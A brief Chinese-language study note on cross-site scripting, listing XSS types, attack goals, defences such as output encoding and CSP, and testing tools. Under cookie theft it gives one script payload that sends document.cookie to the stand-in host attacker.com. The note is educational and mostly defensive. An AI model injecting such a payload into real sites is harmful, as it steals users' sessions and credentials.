# XSS(Cross-Site Scripting)学习笔记

## 什么是XSS?
XSS是一种Web安全漏洞，允许攻击者在受害者浏览器中执行恶意脚本代码。

## XSS类型

### 1. 反射型XSS
- 恶意链接参数
- 服务器直接返回
- 一次性攻击

### 2. 存储型XSS
- 恶意代码存储服务器
- 长期潜伏
- 危害最大

### 3. DOM型XSS
- 客户端JavaScript处理
- 不经过服务器
- 难以检测

## 攻击原理

### 1. 窃取Cookie
```javascript
<script>document.location='http://attacker.com?c='+document.cookie</script>
```

### 2. 钓鱼攻击
- 伪造登录框
- 窃取用户凭证

### 3. 蠕虫传播
- 自动传播恶意代码
- 社交网站危害大

## 防御措施

### 1. 输入验证
- 白名单验证
- 类型检查

### 2. 输出编码
- HTML编码
- URL编码
- JavaScript编码

### 3. 内容安全策略
- CSP响应头
- 限制脚本执行

### 4. HTTPOnly Cookie
- 禁止JavaScript访问Cookie

## 实践工具

- Burp Suite
- XSStrike
- BeEF (浏览器利用框架)

---
*学习时间: 2026-02-20*
*目标: 成为世界第一黑客*
